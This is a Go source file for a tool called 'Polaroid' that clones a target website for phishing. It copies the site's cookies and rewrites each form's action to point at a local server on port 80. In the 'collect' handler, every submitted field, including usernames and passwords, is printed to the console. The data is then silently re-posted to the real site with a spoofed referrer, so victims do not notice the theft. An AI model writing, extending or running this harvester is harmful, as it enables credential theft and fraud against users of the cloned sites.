/*
	#######################################################################################

	# Polaroid:	Creates a clone of a given URL with all of the external resources remapped
	# 			to use global URLs.
	#
	# Opt:	-t	Sets the target URL
	#
	# Opt:	-s	Start a web server and serve the modified page, then when input is entered,
				gather the data and retransmit the request to the original page

	#######################################################################################

	# By:		Vyrus
	# Usage:	<polaroid> <-t URL> [-s]

	#######################################################################################
*/

package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strings"
)

var (
	target     string
	serverMode bool
)

func init() {
	flag.StringVar(&target, "t", "", "You must enter a target URL")
	flag.BoolVar(&serverMode, "s", false, "You must indicate server mode")
}

// get base page
func shutter() ([]*http.Cookie, string) {
	basePage, err := http.Get(target)
	if err != nil {
		log.Fatal(err)
	}
	defer basePage.Body.Close()
	originalHTML, err := ioutil.ReadAll(basePage.Body)
	if err != nil {
		log.Fatal(err)
	}

	return basePage.Cookies(), string(originalHTML)
}

// replace local paths with global ones
func retouch(originalHTML string) string {
	urlObj, err := url.Parse(target)
	if err != nil {
		log.Fatal(err)
	}

	pathParts := strings.Split(urlObj.Path, "/")
	path := strings.TrimSuffix(urlObj.Path, pathParts[len(pathParts)-1])
	output := strings.Replace(string(originalHTML), "=\"/", "=\""+urlObj.Scheme+"://"+urlObj.Host+"/", -1)
	output = strings.Replace(string(output), "=\"../", "=\""+urlObj.Scheme+"://"+urlObj.Host+path+"../", -1)
	return output
}

func getAction(form string) string {
	formTagParts := strings.Split(form, "action=\"")
	return strings.Split(formTagParts[1], "\"")[0]
}

func fixForms(page string) string {
	for _, form := range findForms(page) {
		action := getAction(form)
		fixedForm := strings.Replace(form, action, base64.StdEncoding.EncodeToString([]byte(action)), -1)
		page = strings.Replace(page, form, fixedForm, -1)
	}
	return page
}

func findForms(page string) []string {
	formRgx := regexp.MustCompile(`<form .+>`)
	return formRgx.FindAllString(string(page), -1)
}

/*
	###################################################

	# HTTP Functions

	###################################################
*/

func srvIndex(w http.ResponseWriter, r *http.Request) {
	// get cookies from the original site
	cookies, page := shutter()
	for _, cookie := range cookies {
		// explicitly set the domain of each cookie
		if cookie.Domain == "" {
			urlObj, err := url.Parse(target)
			if err != nil {
				log.Fatal(err)
			}
			cookie.Domain = urlObj.Host
		}
		http.SetCookie(w, cookie)
		fmt.Println(cookie.Raw)
	}

	// show poloroid
	io.WriteString(w, fixForms(retouch(page)))
}

func collect(w http.ResponseWriter, r *http.Request) {
	// get uri
	path := strings.TrimLeft(r.RequestURI, "/")

	// remove GET vars from path
	if strings.Contains(path, "?") {
		path = strings.Split(path, "?")[0]
	}

	// decode path to retrieve action
	action, err := base64.StdEncoding.DecodeString(path)
	if err != nil {
		log.Fatal(err)
	}

	// get and post vars
	err = r.ParseForm()
	if err != nil {
		log.Fatal(err)
	}

	// sort post vars (this is a "go" thing)
	var keys []string
	for k := range r.Form {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	vars := ""
	for _, key := range keys { // fields["key"] = "value";
		vars = vars + `fields["` + key + `"] = "` + r.FormValue(key) + `";`
		fmt.Println(key + " = " + r.FormValue(key))
	}
	fmt.Println("-----")

	// build collector
	collector := `<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">` +
		`<html><head><meta http-equiv="Content-type" content="text/html;charset=UTF-8"><title></title></head>` +
		`<body><script type="text/javascript">var method = "` + r.Method + `";var action = "` + string(action) +
		`";var fields=new Array();` + vars +
		`var myForm=document.createElement("form");myForm.setAttribute("method",method);myForm.setAttribute("action",action);` +
		`for(var key in fields){var hiddenField=document.createElement("input");hiddenField.setAttribute("type","hidden");` +
		`hiddenField.setAttribute("name",key);hiddenField.setAttribute("value",fields[key]);myForm.appendChild(hiddenField);};` +
		// TODO => fix JS to rewrite Referer and Origin HTTP headers on all browsers
		`delete window.document.referrer;window.document.__defineGetter__('referrer',function(){return "` + target + `";});` +
		// TODO <=
		`document.body.appendChild(myForm);myForm.submit();</script></body></html>`

	// return page
	io.WriteString(w, collector)
}

func main() {
	// check args
	flag.Parse()
	if target == "" {
		flag.Usage()
		os.Exit(1)
	}

	// take poloroid
	_, film := shutter()
	poloroid := retouch(film)

	// if not in server mode, output cloned site and exit
	if !serverMode {
		err := ioutil.WriteFile("index.html", []byte(retouch(film)), 0644)
		if err != nil {
			log.Fatal(err)
		}
		os.Exit(0)
	}

	// build collector URLs
	http.HandleFunc("/", srvIndex)
	for _, form := range findForms(poloroid) {
		http.HandleFunc("/"+base64.StdEncoding.EncodeToString([]byte(getAction(form))), collect)
	}

	// start web server
	log.Fatal(http.ListenAndServe(":80", nil))
}
